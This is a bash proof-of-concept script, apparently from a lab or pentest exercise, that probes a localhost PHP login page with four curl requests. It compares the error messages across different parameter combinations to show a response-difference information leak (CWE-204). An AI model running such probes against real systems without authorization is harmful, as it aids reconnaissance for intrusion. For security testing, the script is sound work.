#!/bin/bash

# POC: User Enumeration via Authentication Response Differences
# This demonstrates that the application reveals different responses based on parameter presence

TARGET="http://localhost:3000/index.php"
ERROR_MSG="Oh Sorry but...you are not the admin"

echo "=================================================="
echo "POC: User Enumeration via Response Differences"
echo "=================================================="
echo ""

echo "[TEST 1] Both username and password parameters present"
echo "Command: curl -s \"${TARGET}?username=admin&password=test\""
RESPONSE1=$(curl -s "${TARGET}?username=admin&password=test")
if echo "$RESPONSE1" | grep -q "$ERROR_MSG"; then
    echo "✓ Result: Error message DISPLAYED"
    echo "  Message found: '$ERROR_MSG'"
else
    echo "✗ Result: Error message NOT displayed"
fi
echo ""

echo "[TEST 2] Only username parameter present"
echo "Command: curl -s \"${TARGET}?username=admin\""
RESPONSE2=$(curl -s "${TARGET}?username=admin")
if echo "$RESPONSE2" | grep -q "$ERROR_MSG"; then
    echo "✗ Result: Error message DISPLAYED"
else
    echo "✓ Result: Error message NOT displayed (different behavior!)"
fi
echo ""

echo "[TEST 3] Only password parameter present"
echo "Command: curl -s \"${TARGET}?password=test\""
RESPONSE3=$(curl -s "${TARGET}?password=test")
if echo "$RESPONSE3" | grep -q "$ERROR_MSG"; then
    echo "✗ Result: Error message DISPLAYED"
else
    echo "✓ Result: Error message NOT displayed (different behavior!)"
fi
echo ""

echo "[TEST 4] Both parameters present but empty"
echo "Command: curl -s \"${TARGET}?username=&password=\""
RESPONSE4=$(curl -s "${TARGET}?username=&password=")
if echo "$RESPONSE4" | grep -q "$ERROR_MSG"; then
    echo "✓ Result: Error message DISPLAYED"
    echo "  Message found: '$ERROR_MSG'"
else
    echo "✗ Result: Error message NOT displayed"
fi
echo ""

echo "=================================================="
echo "VULNERABILITY ANALYSIS"
echo "=================================================="

# Check if behavior differs between tests
TEST1_HAS_MSG=$(echo "$RESPONSE1" | grep -q "$ERROR_MSG" && echo "yes" || echo "no")
TEST2_HAS_MSG=$(echo "$RESPONSE2" | grep -q "$ERROR_MSG" && echo "yes" || echo "no")
TEST3_HAS_MSG=$(echo "$RESPONSE3" | grep -q "$ERROR_MSG" && echo "yes" || echo "no")
TEST4_HAS_MSG=$(echo "$RESPONSE4" | grep -q "$ERROR_MSG" && echo "yes" || echo "no")

echo "Response Summary:"
echo "  Both params provided: Error message = $TEST1_HAS_MSG"
echo "  Only username:        Error message = $TEST2_HAS_MSG"
echo "  Only password:        Error message = $TEST3_HAS_MSG"
echo "  Both params empty:    Error message = $TEST4_HAS_MSG"
echo ""

if [ "$TEST1_HAS_MSG" != "$TEST2_HAS_MSG" ] || [ "$TEST1_HAS_MSG" != "$TEST3_HAS_MSG" ]; then
    echo "✓ VULNERABILITY CONFIRMED!"
    echo "  The application exhibits different behaviors based on parameter presence."
    echo "  This allows attackers to:"
    echo "  - Enumerate authentication logic"
    echo "  - Determine when credentials are being processed"
    echo "  - Understand internal authentication workflow"
    echo ""
    echo "IMPACT: User enumeration and information disclosure (CWE-204)"
    exit 0
else
    echo "✗ Vulnerability not confirmed - responses appear consistent"
    exit 1
fi